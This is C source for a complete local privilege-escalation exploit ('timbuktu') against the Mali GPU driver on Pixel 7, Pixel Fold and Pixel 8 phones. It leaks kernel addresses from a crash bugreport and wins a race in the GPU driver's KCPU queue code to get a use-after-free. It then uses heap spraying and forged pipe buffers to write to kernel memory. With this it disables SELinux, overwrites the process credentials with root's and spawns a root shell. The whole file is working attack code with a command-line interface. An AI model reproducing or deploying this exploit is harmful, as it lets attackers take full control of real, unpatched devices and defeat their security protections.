#include "utils.h"
#include "mali.h"
#include "config.h"
#include <sys/system_properties.h>


struct device_config *conf;

int mali_fd;
uint32_t *futex1, *iaddr;

uint64_t kbase_addr;
uint64_t task_struct_addr;
uint64_t init_task_addr;
uint64_t curr_task_addr;
uint64_t init_task_cred_addr;
uint64_t init_cred_addr;
uint64_t sysctl_hung_task_check_interval_secs;
uint64_t selinux_state_addr;
uint64_t ts_real_cred_addr;
uint64_t ts_cred_addr;
uint64_t init_task_real_cred_addr;
uint64_t anon_pipe_buf_ops;

uint32_t device_model = 0;
uint32_t real_cred_off = 0;
uint32_t cred_off = 0;
uint64_t vmemmap_start = 0;

pthread_t setup_thr, uaf_thr, trigger_thr;

int pipefds[PIPE_NUM_SPRAYS][2];
struct realloc_thread_arg rta[REALLOC_THREADS];
struct realloc_thread_arg rta_pipe_buf[REALLOC_THREADS];

pthread_cond_t cond, cond2;
pthread_mutex_t lock, lock2;

static int state = 0;

static volatile size_t g_trigger_now;

int prepare_blocking_socket(struct realloc_thread_arg * rta) {
  static int sock_counter;

  char buf[200] = {0}; // should be less than (sk->sk_sndbuf - 32), you can use getsockopt()
  struct sockaddr_un addr;
  struct timeval tv;

  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf)
  };

  struct msghdr msg = {
    .msg_name = &addr,
    .msg_namelen = sizeof(addr),
    .msg_iov = &iov,
    .msg_iovlen = 1,
    .msg_control = NULL,
    .msg_controllen = 0,
    .msg_flags = 0, 
  };

  if ((rta->send_fd = socket(AF_UNIX, SOCK_DGRAM, 0)) < 0 ||
      (rta->recv_fd = socket(AF_UNIX, SOCK_DGRAM, 0)) < 0)
  {
    goto fail;
  }
  memset(&tv, 0, sizeof(tv));
  memset((void *) &addr, 0, sizeof(addr));
  addr.sun_family = AF_UNIX;
  sprintf(addr.sun_path + 1, "sock_%d_1_%d", gettid(), ++sock_counter);  
  
  while (bind(rta->recv_fd, (struct sockaddr*)&addr, sizeof(addr)))
  {
    if (errno != EADDRINUSE)
    {
      goto fail;
    }
  }

  if (connect(rta->send_fd, (struct sockaddr*)&addr, sizeof(addr)))
  {
    goto fail;
  }

  setsockopt(rta->send_fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
  setsockopt(rta->recv_fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
  
  while (sendmsg(rta->send_fd, &msg, MSG_DONTWAIT) > 0)  // <----- don't forget MSG_DONTWAIT
    ;
  if (errno != EAGAIN)  // <----- did we failed because the receive buffer is full ?
  {
    goto fail;
  }

  rta->addr = addr;

  return 0;

fail:
  return -1;
}


void* realloc_pipe_buf_thread(void *arg) 
{
  int ret;
  struct realloc_thread_arg *rta_pipe_buf = (struct realloc_thread_arg*) arg;

  if (set_prio(SCHED_OTHER, 0) != 0)
    printf("set prio wrong\n");
  if (pin_cpu(CPU1, pthread_self()) != 0)
    printf("Pin cpu wrong\n");
  
  uint64_t kaddr;
  if (state == SELINUX_STATE) // set selinux to permissive mode
    kaddr = kimg_to_lm(selinux_state_addr, kbase_addr);
  if (state == REAL_CRED_STATE) // task_addr + OFFSET_TS_REAL_CRED
    kaddr = kimg_to_lm(task_struct_addr+real_cred_off, kbase_addr);
  if (state == TS_CRED_STATE) // task_addr + OFFSET_TS_CRED
    kaddr = kimg_to_lm(task_struct_addr+cred_off, kbase_addr);

  uint64_t target = virt_to_page(kaddr, vmemmap_start);

  struct pipe_buffer pb;
  pb.page = target;
  pb.offset = kaddr & 0xfff;
  pb.len = 0;
  pb.ops = anon_pipe_buf_ops; 
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0x4141414141414141;

  int fd = open("/dev/mali0", O_RDWR);
  struct kbase_ioctl_version_check vc = {
    .major = 11,
    .minor = 11
  };

  ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
  struct kbase_ioctl_set_flags set_flags = { .create_flags = 0 };
  ioctl(fd, KBASE_IOCTL_SET_FLAGS, &set_flags);

  struct kbase_ioctl_mem_profile_add iompa = {
    .buffer = (uint64_t) &pb,
    .len = sizeof(struct pipe_buffer),
  };

  pthread_mutex_lock(&lock2);
  pthread_cond_wait(&cond2, &lock2);

  pthread_mutex_unlock(&lock2);
  ret = ioctl(fd, KBASE_IOCTL_MEM_PROFILE_ADD, &iompa);

  sleep(10);
  return NULL;
}


void * realloc_thread(void *arg) {
  int ret;
  struct realloc_thread_arg *rta = (struct realloc_thread_arg*) arg;

  if (set_prio(SCHED_OTHER, 0) != 0)
    printf("set prio wrong\n");
  if (pin_cpu(CPU1, pthread_self()) != 0)
    printf("Pin cpu wrong\n");

  uint64_t sysctl_var_addr = kbase_addr + conf->offset_sysctl_var;
  struct dma_fence* base = (struct dma_fence*) malloc(sizeof(struct dma_fence));
  base->flags = 5;
  base->refcount = 1;
  base->context = 5;
  base->seqno = 6;
  base->cb_list.next = 0x43434343;
  base->cb_list.prev = 0x42424242;
  base->ops = (uint64_t *) (sysctl_var_addr - 0x30);
  
  char fake_struct[REALLOC_BUF_SIZE] = {0};
  memset(fake_struct, 0x46, REALLOC_BUF_SIZE);
  memcpy(fake_struct, base, sizeof(struct dma_fence));

  struct msghdr mhdr;
  char buf[200] = {0};

  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf),
  };
  memset(&mhdr, 0, sizeof(mhdr));
  mhdr.msg_iov = &iov;
  mhdr.msg_iovlen = 1;

  prepare_blocking_socket(rta);
  iov.iov_len = 16;

  struct cmsghdr *first;

  // necessary to pass checks in __scm_send()
  first = (struct cmsghdr*) fake_struct;
  first->cmsg_len = REALLOC_BUF_SIZE;
  first->cmsg_level = 0; // must be different than SOL_SOCKET=1 to "skip" cmsg
  first->cmsg_type = 1; // arbitrary value*/
  size_t offset =  offsetof(struct cmsghdr, cmsg_level);
  uint64_t *point_to_null = (uint64_t *)(fake_struct+offset);
  *point_to_null = (sysctl_var_addr - 0x30);

  /* This is the data that will overwrite the vulnerable object in the heap */
  mhdr.msg_control = (void*) fake_struct;

  /* This is the user controlled size, eventually kmalloc(msg_controllen) will occur */
  mhdr.msg_controllen = REALLOC_BUF_SIZE;

  pthread_mutex_lock(&lock);
  pthread_cond_wait(&cond, &lock);

  pthread_mutex_unlock(&lock);
  fpost(futex1);
  if (sendmsg(rta->send_fd, &mhdr, 0) <0)
    ;
  sleep(5);

  return NULL;
}


void init_realloc_pipe_buf_threads()
{
  pthread_cond_init(&cond2, NULL);
  pthread_mutex_init(&lock2, NULL);   

  memset(rta_pipe_buf, 0, sizeof(rta_pipe_buf));

  pthread_attr_t attr;
  pthread_attr_init(&attr);
  pthread_attr_setstacksize(&attr, 128 << 10);
  for (int t=0; t < REALLOC_THREADS; t++)
    pthread_create(&rta_pipe_buf[t].tid, &attr, realloc_pipe_buf_thread, &rta_pipe_buf[t]);   
}


void init_realloc_threads()
{
  pthread_cond_init(&cond, NULL);
  pthread_mutex_init(&lock, NULL);   

  memset(rta, 0, sizeof(rta));

  pthread_attr_t attr;
  pthread_attr_init(&attr);
  pthread_attr_setstacksize(&attr, 128 << 10);
  for (int t=0; t < REALLOC_THREADS; t++)
    pthread_create(&rta[t].tid, &attr, realloc_thread, &rta[t]);
}


void destroy_realloc_threads() {
  for (int t = 0; t < REALLOC_THREADS; t++) {
    close(rta[t].recv_fd);    
    close(rta[t].send_fd);
  }
}


void* setup_func(void *arg)
{
  if (set_prio(SCHED_IDLE, 0) != 0)
    printf("set prio wrong\n");
  if (pin_cpu(CPU1, pthread_self()) != 0)
    printf("Pin cpu wrong\n");


  mali_fd = open("/dev/mali0", O_RDWR);
  struct kbase_ioctl_version_check vc = {
    .major = 11,
    .minor = 11
  };
  ioctl(mali_fd, KBASE_IOCTL_VERSION_CHECK, &vc);
  struct kbase_ioctl_set_flags set_flags = { .create_flags = 0 };
  ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &set_flags);
  void *r = (void *) mmap((void *) 0x21000000UL, 0x400000, PROT_READ|PROT_WRITE, 
                 MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, -1, 0ul);

  memset(r+8, 0x00, 1); 
  memset(r+9, 0x04, 1); 
  memset(r+10, 0x00, 1); 
  memset(r+11, 0x21, 1); 
  mprotect(r, 0x400000, PROT_READ);

  struct kbase_ioctl_kcpu_queue_new kqc = {  };
  int ret = ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &kqc);
  return NULL;
}


void* trigger_func(void *arg) {
  if (set_prio(SCHED_OTHER, 0) != 0)
    printf("set prio wrong\n");
  if (pin_cpu(CPU2, pthread_self()) != 0)
    printf("pin cpu wrong\n");

  g_trigger_now = 1;

  pthread_cond_broadcast(&cond);

  sleep_ms(1);  

  return NULL;
}


static inline __attribute__((always_inline)) void pipe_spray() {
  if (set_prio(SCHED_OTHER, 0) != 0)
    printf("set prio wrong\n");
  if (pin_cpu(CPU1, pthread_self()) != 0)
    printf("pin cpu wrong\n");
    
  for (int i = 0; i < PIPE_NUM_SPRAYS; i++) {
    fcntl(pipefds[i][1], F_SETPIPE_SZ, 4096);
  }
}


void * uaf_func(void *arg) {
  if (set_prio(SCHED_IDLE, 0) != 0)
    printf("set prio wrong\n");
  if (pin_cpu(CPU1, pthread_self()) != 0)
    printf("pin cpu wrong\n");


  struct kbase_ioctl_kcpu_queue_enqueue kqe = {
    .addr = 0x21000000ul,
    .nr_commands = 1,
    .id = 0
  };

  fwait(futex1);
  int ret = ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_ENQUEUE, &kqe);
  pipe_spray();
  
  return 0;
}


void trigger_leak(void) {
  uint64_t r[1] = {0xffffffffffffffff};
  syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
  syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
  syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
  intptr_t res = 0;
  memcpy((void*)0x20000040, "/dev/mali0\000", 11);
  res = syscall(__NR_openat, 0xffffffffffffff9cul, 0x20000040ul, 0ul, 0ul);
  if (res != -1)
    r[0] = res;
  *(uint32_t*)0x20000540 = 0;
  syscall(__NR_ioctl, r[0], 0xc0048034, 0x20000540ul);
  *(uint32_t*)0x20000000 = 0;
  syscall(__NR_ioctl, r[0], 0x40048001, 0x20000000ul);
  memcpy((void*)0x200000c0,
         "\xed\x3b\xf1\x70\x58\xd3\x37\x90\x08\x7b\xa3\x35\xe3\xf9\x47\xd5\xea"
         "\xb6\x40\x0f\xbe\xfc\xf2\xcc\xd5\xdb\xd3\xfd\x5b\x90\x32\x22",
         32);
  syscall(__NR_ioctl, r[0], 0x40108035, 0x200000c0ul);
}


int gen_bugreport() {
    char output[PROP_VALUE_MAX+1];
    
  
    system("mkdir /data/local/tmp/bugreport");
    system("bugreportz -s > /data/local/tmp/bugreport/report.zip");

    system("unzip /data/local/tmp/bugreport/*.zip -d /data/local/tmp/bugreport/ 1>/dev/null");
    system("cat /data/local/tmp/bugreport/*.txt > /data/local/tmp/bugreport/output.txt");

    FILE *stream;
    char *contents;
    int sz = 0;

    stream = fopen("/data/local/tmp/bugreport/output.txt", "rb");
    fseek(stream, 0L, SEEK_END);
    sz = ftell(stream);
    fseek(stream, 0L, SEEK_SET);
    contents = malloc(sz+1);
    size_t size = fread(contents,1, sz, stream);
    contents[size] = 0; 

    char delim[] = "__alloc_pages";
    char *ptr = strstr(contents, delim);
    char *ptr2 = strstr(ptr, "x28: ");
    char x28[20] = {0};
    strncpy(x28, ptr2+5, 16);
  
    char *ptr3 = strstr(ptr, "x27: ");
    char x27[20] = {0};
    strncpy(x27, ptr3+5, 16);
  
    // if p8-custom-kernel
    //ptr2 = strstr(ptr, "x18: ");
    ptr2 = strstr(ptr, "x26: ");
    char x26[20] = {0};
    strncpy(x26, ptr2+5, 16);

    task_struct_addr = (int64_t) strtoumax(x28, NULL, 16);
    uint64_t kfunc_addr = (int64_t) strtoumax(x26, NULL, 16); 
    if (kfunc_addr == 0) {
       kfunc_addr = (int64_t) strtoumax(x27, NULL, 16);
    }

    kbase_addr = kfunc_addr - conf->offset_kbase;
    printf("[+] Leaked addresses:\n");
    printf("task_struct = %" PRIx64 "\n", task_struct_addr);
    printf("kaddr = %" PRIx64 "\n", kbase_addr);
    selinux_state_addr = kbase_addr + conf->offset_selinux_state;
    printf("selinux_state_addr = %" PRIx64 "\n", selinux_state_addr);
    init_task_addr = kbase_addr + conf->offset_init_task;
    curr_task_addr = init_task_addr;
    printf("init_task_addr = %" PRIx64 "\n", init_task_addr);
    init_cred_addr = kbase_addr + conf->offset_init_cred;
    printf("init_cred addr = %" PRIx64 "\n", init_cred_addr);
    anon_pipe_buf_ops = kbase_addr + conf->offset_pipe_buf_ops;
    printf("anon_pipe_buf_ops addr = %" PRIx64 "\n", anon_pipe_buf_ops);

    fclose(stream);
    free(contents);
    system("rm -fr /data/local/tmp/bugreport/");
    return 0;
}

int is_vulnerable(int check_build) {
    if (!check_build) {
      int mali_fd = open("/dev/mali0", O_RDWR);
      struct kbase_ioctl_version_check vc = {
        .major = 11,
        .minor = 11
      };
      ioctl(mali_fd, KBASE_IOCTL_VERSION_CHECK, &vc);
      close(mali_fd);

      if (vc.minor < 16 && vc.minor >= 11) {
        printf("[+] Vulnerable\n");
      } else {
        printf("[-] Not vulnerable\n");
        return -1;
      }
    }
 
    char fingerprint[PROP_VALUE_MAX+1];
    __system_property_get("ro.vendor.build.fingerprint", fingerprint);
    int conf_idx = -1;
    for (int i = 0; i < sizeof(device_configs)/sizeof(device_configs[0]); i++) {
        conf = &device_configs[i];
        if (!strcmp(conf->fingerprint, fingerprint)) {
          conf_idx = i;
          break;
        }
    }

    if (conf_idx < 0) {
      printf("[-] Support for device/firmware not yet added\n");
      return -1;
    } else {
      printf("[+] Device firmware is supported\n");
    }


    char model[PROP_VALUE_MAX+1];
    __system_property_get("ro.product.model", model);
    if (strstr(model, "Pixel 7") != NULL || strstr(model, "Pixel Fold") != NULL) {
      device_model = 7;
      real_cred_off = OFFSET_TS_REAL_CRED_P7;
      cred_off = OFFSET_TS_CRED_P7;
      vmemmap_start = VMEMMAP_START_P7;
    } else if (strstr(model, "Pixel 8") != NULL) {
      device_model = 8;
      real_cred_off = OFFSET_TS_REAL_CRED_P8;
      cred_off = OFFSET_TS_CRED_P8;
      vmemmap_start = VMEMMAP_START_P8;
    }

    return 0;
}

int main(int argc, char* argv[])
{
  //setbuf(stdout, NULL);
  if (argc < 2) {
    printf("Usage: timbuktu {--exploit/--is-vulnerable}\n");
    return -1;
  }

  if (!strcmp(argv[1], "--is-vulnerable"))
    return is_vulnerable(0);

  if (is_vulnerable(1) < 0)
    return -1;

  if (set_prio(SCHED_OTHER, 0) != 0)
    printf("set prio wrong\n");
  if (pin_cpu(CPU0, pthread_self()) != 0)
    printf("pin cpu wrong\n");
    
  srand(time(NULL));

  trigger_leak();

  printf("[~] Generating bugreport\n");

  int ret = gen_bugreport();

  printf("\n[~] Disabling SELinux: "); fflush(stdout);
  while (1) {
    iaddr = mmap(NULL, sizeof(*iaddr) * 2, PROT_READ | PROT_WRITE,
               MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    futex1 = &iaddr[0];
    *futex1 = 0; 

    char buf[0x1000];
    memset(buf, 0x41, 0x1000);
    for (int i = 0; i < PIPE_NUM_SPRAYS; i++) {
      pipe(pipefds[i]);
      fcntl(pipefds[i][1], F_SETFL, O_NONBLOCK);
      fcntl(pipefds[i][0], F_SETFL, O_NONBLOCK); 
      write(pipefds[i][1], buf, 0x1000);
    }

    g_trigger_now = 0;
    init_realloc_threads();
    init_realloc_pipe_buf_threads();

    sleep(1);
    pthread_create(&setup_thr, NULL, setup_func, NULL);
    pthread_join(setup_thr, NULL);

    pthread_create(&uaf_thr, NULL, uaf_func, NULL);

    pthread_create(&trigger_thr, NULL, trigger_func, NULL);
    pthread_join(trigger_thr, NULL);

    sleep(1);
    destroy_realloc_threads();  

    pthread_cond_broadcast(&cond2);
    sleep(2);

    char bufp[0x100];
    uint64_t t = 0;
    for (int i = 0; i < PIPE_NUM_SPRAYS; i++) {
      uint64_t wr_value = 0;
      unsigned char wr_selinux = 0;
      if (state == SELINUX_STATE)
        wr_value = 0;

      if (state == REAL_CRED_STATE)
        wr_value = init_cred_addr;

      if (state == TS_CRED_STATE)
        wr_value = init_cred_addr;

      int w;
      int sz = fcntl(pipefds[i][1], F_GETPIPE_SZ);
      if (state != SELINUX_STATE)
        w = write(pipefds[i][1], &wr_value, sizeof(wr_value));
      else
        w = write(pipefds[i][1], &wr_selinux, sizeof(wr_selinux));

      // detect successful write
      if ((state != SELINUX_STATE && sz == 4096 && w == 8) ||
          (state == SELINUX_STATE && sz == 4096 && w == 1)) {
        switch(state) {
          case SELINUX_STATE: {
            printf("Done\n[~] Overwriting real_cred: "); 
            fflush(stdout); break; }
          case REAL_CRED_STATE: {
            printf("Done\n[~] Overwriting cred: "); 
            fflush(stdout); break;
          }
          case TS_CRED_STATE: {
            printf("Done\n"); fflush(stdout); break;
          } 
          default: break;
        }
        state++;      
      }
    }

    sleep(1);
    close(mali_fd);

    if (state == FINISHED_STATE) {
      printf("[+] Spawning root shell\n\n"); fflush(stdout);
      execve("/bin/sh", NULL, NULL); 
      // Unreachable
      while(1);
    }
  } 
  return 0;
}
